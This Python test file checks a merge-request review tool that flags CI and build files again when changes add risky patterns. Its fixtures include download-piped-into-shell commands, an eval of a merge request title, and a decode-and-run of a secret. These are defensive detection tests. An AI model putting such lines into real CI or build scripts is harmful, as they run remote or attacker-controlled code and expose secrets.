"""itemator/reask.py: a file the team policy quiets is asked about again when the change adds a shape that has carried
attacks to it. Real git repositories in tmp, a fake GitLab API, no network."""
from itemator import reask as R
from test_ci import FIXED, FakeHttp, isolated, issue, job, mr, repo, routes  # noqa: F401  (fixtures)
from test_policy import facts, with_policy

QUIET_CI = '[ignore]\npaths = [".gitlab-ci.yml"]\n'
ROUTINE = "test:\n  script: [pytest, ruff]\n"
PIPED = "test:\n  script:\n    - curl -sSL https://example.com/i.sh | sh\n    - pytest\n"


def f(path, *added):
    return {"filename": path, "status": "modified", "patch": "@@ -1,1 +1,%d @@\n" % (len(added) + 1) + "".join(f"+{a}\n" for a in added)}


def test_a_routine_edit_to_a_quieted_file_stays_quiet(repo, tmp_path, monkeypatch):
    with_policy(repo, QUIET_CI)
    out = facts(repo, repo.commit({"src/parser.py": FIXED, ".gitlab-ci.yml": ROUTINE}), tmp_path, monkeypatch)
    assert out["state"] == "inside_ask" and out["extras"] == []
    assert "reasked_extras" not in out["policy"]


def test_a_download_piped_into_a_shell_is_asked_again_and_always_is_not_offered(repo, tmp_path, monkeypatch):
    with_policy(repo, QUIET_CI)
    out = facts(repo, repo.commit({"src/parser.py": FIXED, ".gitlab-ci.yml": PIPED}), tmp_path, monkeypatch)
    assert out["state"] == "extras" and [e["name"] for e in out["extras"]] == [".gitlab-ci.yml"]
    e = out["extras"][0]
    want = ("The team policy stops asking about `.gitlab-ci.yml`, but this change adds a download piped into a shell to it, "
            "so it is asked again.")
    assert want in e["thread_stub"] and e["plain_facts"]["reasked"] == want
    assert e["thread_stub"].index(want) < e["thread_stub"].index("To keep it")
    assert "always" not in e["thread_stub"]
    assert out["policy"]["reasked_extras"] == [".gitlab-ci.yml"] and out["policy"]["ignored_extras"] == []


def test_a_kind_the_policy_quiets_is_asked_again_too(repo, tmp_path, monkeypatch):
    with_policy(repo, '[ignore]\nkinds = ["ci_or_config"]\n')
    out = facts(repo, repo.commit({"src/parser.py": FIXED, ".gitlab-ci.yml": PIPED}), tmp_path, monkeypatch)
    assert [e["name"] for e in out["extras"]] == [".gitlab-ci.yml"] and "asked again" in out["extras"][0]["thread_stub"]


def test_without_a_policy_nothing_is_reworded(repo, tmp_path, monkeypatch):
    with_policy(repo, None)
    out = facts(repo, repo.commit({"src/parser.py": FIXED, ".gitlab-ci.yml": PIPED}), tmp_path, monkeypatch)
    assert "asked again" not in out["extras"][0]["thread_stub"] and "reasked" not in out["extras"][0]["plain_facts"]


def test_the_shapes_that_ask_again_and_the_ones_that_do_not():
    assert R.find([f(".gitlab-ci.yml", "  image: php:latest")]) == {}                 # moves, but not a shape of attack
    assert R.find([f(".gitlab-ci.yml", "  # curl https://x | sh")]) == {}             # a comment
    assert R.find([f(".gitlab-ci.yml", "  - curl https://x | sh")]) == {".gitlab-ci.yml": ["a download piped into a shell"]}
    inc = R.find([f(".gitlab-ci.yml", "include:", "  - project: a/b", "    ref: main")])
    assert inc == {".gitlab-ci.yml": ["an include on a branch"]}
    got = R.find([f("ci/run.sh", 'eval "$CI_MERGE_REQUEST_TITLE"')])
    assert list(got) == ["ci/run.sh"] and "stranger" in got["ci/run.sh"][0] and "(line " in got["ci/run.sh"][0]
    assert R.find([f("build.sh", "echo $SECRET | base64 -d | sh")])["build.sh"][0].startswith("a line that decodes text and runs it")


def test_the_sentence_shows_two_shapes_and_counts_the_rest():
    s = R.sentence([("a.yml", ["x", "y", "z"]), ("b.yml", ["w"])])
    assert s == "The team policy stops asking about `a.yml` (and 1 more of its files), but this change adds x; y and 1 more to it, so it is asked again."
    assert R.hits({"a": ["x"]}, ["b", "a", "a"]) == [("a", ["x"])]


def test_a_shape_in_another_file_does_not_wake_the_quieted_one(repo, tmp_path, monkeypatch):
    assert R.hits({"a": ["x"], "c": ["y"]}, ["b", "a"]) == [("a", ["x"])]
    with_policy(repo, '[ignore]\npaths = [".gitlab-ci.yml", "Dockerfile"]\n')
    out = facts(repo, repo.commit({"src/parser.py": FIXED, ".gitlab-ci.yml": ROUTINE,
                                   "Dockerfile": "FROM python:3.12\nRUN curl -sSL https://example.com/i.sh | sh\n"}), tmp_path, monkeypatch)
    assert [e["name"] for e in out["extras"]] == ["Dockerfile"] and out["policy"]["reasked_extras"] == ["Dockerfile"]
    assert [q["name"] for q in out["policy"]["ignored_extras"]] == [".gitlab-ci.yml"]
